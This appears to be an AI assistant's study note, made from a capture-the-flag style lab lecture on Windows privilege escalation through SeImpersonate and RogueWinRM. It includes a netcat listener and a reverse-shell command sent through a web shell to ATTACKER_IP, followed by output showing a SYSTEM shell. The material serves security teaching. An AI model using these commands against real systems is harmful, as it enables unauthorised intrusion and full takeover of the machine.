
Here’s a **detailed and structured Obsidian note** based on your lecture, optimized for **easy review and recall**. It includes headings, summaries, commands, and visuals you can mentally picture. You can copy-paste this directly into Obsidian for organized study.

---

## 🧑‍🎤 Privilege Escalation via `SeImpersonate` / `SeAssignPrimaryToken`

---

### 🧠 Summary

* These privileges allow a process to **impersonate another user** or **spawn a process** under another user's security context.
* Common in services like FTP, IIS, or BITS where identity delegation is necessary.
* **Abused by attackers** to elevate to SYSTEM if a process with these privileges can receive authenticated connections.

---

## 🧩 Key Concepts

### 🛡 What are `SeImpersonate` and `SeAssignPrimaryToken`?

| Privilege                       | Description                                    |
| ------------------------------- | ---------------------------------------------- |
| `SeImpersonatePrivilege`        | Allows impersonating a user's security context |
| `SeAssignPrimaryTokenPrivilege` | Allows assigning tokens to new processes       |

---

### 🎯 Real-World Analogy: FTP Service

Without impersonation:

* FTP service uses **its own token** (e.g. user `ftp`) to access files.
* Complex permission management per file.
* Potential overexposure if service is compromised.

With impersonation:

* FTP service borrows **Ann's token** when she logs in.
* It accesses only what Ann is allowed to.
* System handles authorization. Cleaner, safer.

---

### ⚠️ Attacker Use-Case

> If attackers compromise a service account (e.g., IIS) with these privileges, they can impersonate privileged users **connecting to the service**.

### 📌 Common Accounts with These Privileges

* `LOCAL SERVICE`
* `NETWORK SERVICE`
* `iis apppool\defaultapppool` (IIS)
* Any service that expects to act on behalf of users

---

## 🧨 Exploit Scenario: **RogueWinRM**

---

### 📄 Goal

Gain SYSTEM privileges by exploiting the **BITS to WinRM connection** using **RogueWinRM**.

---

### 📍 Exploit Path

1. 🛠 Web shell already uploaded to IIS:

   ```
   http://10.10.97.181/
   ```

2. ✅ Confirm privileges using web shell:

   ```
   whoami /priv
   ```

   Look for:

   * `SeImpersonatePrivilege` → Enabled
   * `SeAssignPrimaryTokenPrivilege` → Enabled

---

### 🚀 How RogueWinRM Works

* When BITS starts, it connects to `port 5985` (WinRM) as SYSTEM.
* If **WinRM is not running**, attacker can:

  * Spawn a **fake WinRM listener** on port 5985.
  * Receive an authenticated SYSTEM connection from BITS.
  * Use impersonation to execute commands as SYSTEM.

---

## 🧪 Step-by-Step: Execute the Exploit

### 1️⃣ On Attacker Machine – Start Listener

```bash
nc -lvp 4442
```

---

### 2️⃣ On Victim via Web Shell – Trigger Exploit

```cmd
C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

🔹 `-p` specifies the executable (Netcat).
🔹 `-a` passes arguments to Netcat to spawn a reverse shell.

---

### ⏳ Notes

* Exploit may take **up to 2 minutes**.
* Web shell/browser may **appear frozen**—wait patiently.
* BITS must stop before it can be triggered again.

---

### ✅ Expected Output (Attacker Listener)

```bash
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.x]
whoami
nt authority\system
```

---

## 🏁 Task Wrap-Up

> Using any of the discussed methods, access the **Administrator's desktop**, collect the **flag**, and submit it to complete the task.

---

## 🧠 Quick Review Table

| Step               | Command / Action                                       |
| ------------------ | ------------------------------------------------------ |
| Check privileges   | `whoami /priv`                                         |
| Start listener     | `nc -lvp 4442`                                         |
| Trigger RogueWinRM | `RogueWinRM.exe -p "nc64.exe" -a "-e cmd.exe IP PORT"` |
| Get SYSTEM shell   | Use captured session                                   |

---

Let me know if you'd like a Markdown export or a concept diagram to pair with this note!
